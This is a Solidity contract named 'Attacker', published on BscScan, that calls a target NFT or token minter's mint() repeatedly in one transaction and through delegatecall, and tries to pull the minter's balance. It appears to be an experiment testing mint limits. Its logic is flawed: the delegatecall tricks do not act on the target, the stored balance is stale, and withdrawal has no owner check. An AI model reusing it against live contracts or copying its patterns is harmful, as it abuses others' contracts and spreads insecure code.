/**
 *Submitted for verification at BscScan.com on 2022-08-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface minter {

    function mint() external payable;
    function retrieveBalance() external;
}

contract Attacker {

    uint public minted;
    uint public price = 1 ether/1000;
    uint256 public balance = address(this).balance;
    address public VaultAddress;
    address private minterAdress;
    minter mintContract;

    constructor(address _minterAddr) payable {
        minterAdress = _minterAddr;
        mintContract = minter(_minterAddr);
    }

    function setVaultAddress(address _addr) public {
        VaultAddress = _addr;
    } 

    function mint1() public payable {
        mintContract.mint{value:msg.value}();
    }

    function mint3() public payable {
        mintContract.mint{value:msg.value}();
        mintContract.mint{value:msg.value}();
        mintContract.mint{value:msg.value}();
    }

    function mint3WithFixedPrice() public payable {
        mintContract.mint{value:price}();
        mintContract.mint{value:price}();
        mintContract.mint{value:price}();
    }

    function mint3WithDelegateCall() public payable {
        minterAdress.delegatecall(abi.encodeWithSignature("mint()"));
        minterAdress.delegatecall(abi.encodeWithSignature("mint()"));
        minterAdress.delegatecall(abi.encodeWithSignature("mint()"));
    }

    function retrieveBalanceFromMintContract() public {
        minterAdress.delegatecall(abi.encodeWithSignature("retrieveBalance()"));
    }

    function retrieveBalanceFromThisContract() public {
        address payable receiver = payable(msg.sender);
        receiver.transfer(balance);
    }

}